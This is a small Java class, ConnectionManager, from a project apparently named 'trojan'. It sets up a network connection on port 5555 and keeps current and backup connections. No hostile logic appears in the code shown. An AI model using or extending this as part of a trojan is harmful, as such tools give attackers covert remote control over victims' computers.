package dev.px.trojan.Manager;

import dev.px.trojan.Connections.Connection;
import dev.px.trojan.Connections.Network.ConnectionSocket;
import dev.px.trojan.Connections.Network.CurrentConnection;

public class ConnectionManager {

    private Connection currentConnection;
    private Connection backupConnection;

    public ConnectionManager() {
        try {
            this.currentConnection = new CurrentConnection(5555);
        } catch (Exception e) {e.printStackTrace();}
    }

    public void setCurrentConnection(Connection connection) {
        this.currentConnection = connection;
    }

    public Connection getCurrentConnection() {
        return this.currentConnection;
    }
}
